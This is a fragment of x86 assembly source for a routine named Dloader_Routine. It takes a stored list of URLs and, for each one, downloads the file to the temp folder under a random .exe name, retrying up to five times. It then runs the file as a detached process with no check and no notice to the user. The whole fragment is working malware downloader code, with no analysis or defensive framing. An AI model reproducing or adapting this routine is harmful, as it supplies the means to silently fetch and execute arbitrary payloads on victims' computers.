      DLOADER_REPEAT_COUNT   equ  5

dloader_start:

Dloader_Routine proc
      LOCAL   dld_from:DWORD
      
      pushad
      
      GetTempPath, sizeof dloader_TmpPath, addr dloader_TmpPath
      push    offset dloader_TmpPath
      call    dword ptr [_PathAddBackslash]
      
      mov     eax, dword ptr [dloader_hStruct]
      mov     ecx, dword ptr [eax] ; count
      add     eax, 4
      mov     dld_from, eax
    check_processes_lp:
      push    ecx
      
      invoke  CreateRndString, addr dloader_9b, 8
      lstrcat, addr dloader_TmpPath, addr dloader_9b
      lstrcat, addr dloader_TmpPath, addr exe_ext
            
      mov     ebx, DLOADER_REPEAT_COUNT
    dld_retries_lp:
      xor     eax, eax
      push    eax
      push    eax
      push    offset dloader_TmpPath
      push    dword ptr [dld_from]
      push    eax
      call    _URLDownloadToFile
      test    eax, eax
      je      dld_success
      dec     ebx
      jnz     dld_retries_lp
      jmp     dld_try_next_file
    dld_success:
      RtlZeroMemory, addr sui, sizeof sui
      RtlZeroMemory, addr pri, sizeof pri
      xor     eax, eax
      CreateProcess, addr dloader_TmpPath, eax, eax, eax, eax, DETACHED_PROCESS, eax, eax, addr sui, addr pri
    dld_try_next_file:
      lstrlen, dld_from
      add     dword ptr [dld_from], eax
      inc     dword ptr [dld_from]
      
      pop     ecx
      dec     ecx
      jnz     check_processes_lp 
      
      popad
      
      ret
Dloader_Routine endp

dloader_end: